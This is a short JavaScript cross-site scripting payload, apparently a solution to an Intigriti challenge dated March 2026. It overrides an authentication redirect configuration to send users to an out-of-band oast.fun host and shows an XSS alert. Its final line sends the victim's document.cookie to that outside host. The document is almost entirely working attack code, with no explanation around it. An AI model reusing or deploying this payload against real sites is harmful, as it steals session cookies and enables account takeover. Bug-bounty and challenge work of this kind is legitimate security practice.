// Fixed Auth.loginRedirect method - Intigriti March 2026
window.authConfig = {
    dataset: {
        next: "https://ybfttwhjfsrzfyyuvtjuu0z3r714v9smj.oast.fun/?c=",
        append: "true"
    }
};

// Call it properly
if (window.Auth && window.Auth.loginRedirect) {
    window.Auth.loginRedirect({});
}

alert("XSS via Auth.loginRedirect clobbering!");

// Extra exfil just in case
new Image().src = "https://ybfttwhjfsrzfyyuvtjuu0z3r714v9smj.oast.fun/?cookie=" + encodeURIComponent(document.cookie);
